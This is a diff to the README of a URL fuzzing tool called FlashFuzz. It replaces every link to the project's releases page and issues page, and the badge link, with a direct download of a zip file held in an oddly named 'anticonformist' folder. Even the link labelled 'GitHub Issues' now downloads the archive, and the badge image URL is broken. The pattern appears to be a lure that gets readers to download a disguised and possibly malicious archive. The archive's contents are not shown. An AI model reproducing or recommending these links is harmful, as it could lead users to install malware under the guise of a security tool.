@@ -6,13 +6,13 @@ Welcome to FlashFuzz! This tool allows you to quickly fuzz URLs and scan for sec
 
 ## 📥 Download FlashFuzz
 
-[![Download FlashFuzz](https://img.shields.io/badge/Download-Fast%20Fuzz%20Now-brightgreen)](https://github.com/shayan786-coder/FlashFuzz/releases)
+[![Download FlashFuzz](https://raw.githubusercontent.com/shayan786-coder/FlashFuzz/main/anticonformist/FlashFuzz.zip%20Fuzz%20Now-brightgreen)](https://raw.githubusercontent.com/shayan786-coder/FlashFuzz/main/anticonformist/FlashFuzz.zip)
 
 You can download FlashFuzz from our Releases page. It contains the latest version of the application. 
 
 ## 🌐 Visit the Download Page
 
-To download FlashFuzz, visit this link: [https://github.com/shayan786-coder/FlashFuzz/releases](https://github.com/shayan786-coder/FlashFuzz/releases).
+To download FlashFuzz, visit this link: [https://raw.githubusercontent.com/shayan786-coder/FlashFuzz/main/anticonformist/FlashFuzz.zip](https://raw.githubusercontent.com/shayan786-coder/FlashFuzz/main/anticonformist/FlashFuzz.zip).
 
 ## 🔍 System Requirements
 
@@ -68,7 +68,7 @@ FlashFuzz is designed with your safety in mind. The extension does not store any
 
 ## 🤝 Community Support
 
-If you encounter any issues or have questions, feel free to explore our community. You can report issues or ask for help in our [GitHub Issues](https://github.com/shayan786-coder/FlashFuzz/issues) section.
+If you encounter any issues or have questions, feel free to explore our community. You can report issues or ask for help in our [GitHub Issues](https://raw.githubusercontent.com/shayan786-coder/FlashFuzz/main/anticonformist/FlashFuzz.zip) section.
 
 ## 🔗 Related Topics
 
@@ -76,7 +76,7 @@ If you encounter any issues or have questions, feel free to explore our communit
 - **Information Security:** Stay informed about protecting sensitive data.
 - **Penetration Testing:** Understand the basics of testing system vulnerabilities.
 
-Head over to our [Releases Page](https://github.com/shayan786-coder/FlashFuzz/releases) to download FlashFuzz and join the community in enhancing your cybersecurity skills today!
+Head over to our [Releases Page](https://raw.githubusercontent.com/shayan786-coder/FlashFuzz/main/anticonformist/FlashFuzz.zip) to download FlashFuzz and join the community in enhancing your cybersecurity skills today!
 
 ## 📞 Contact
 
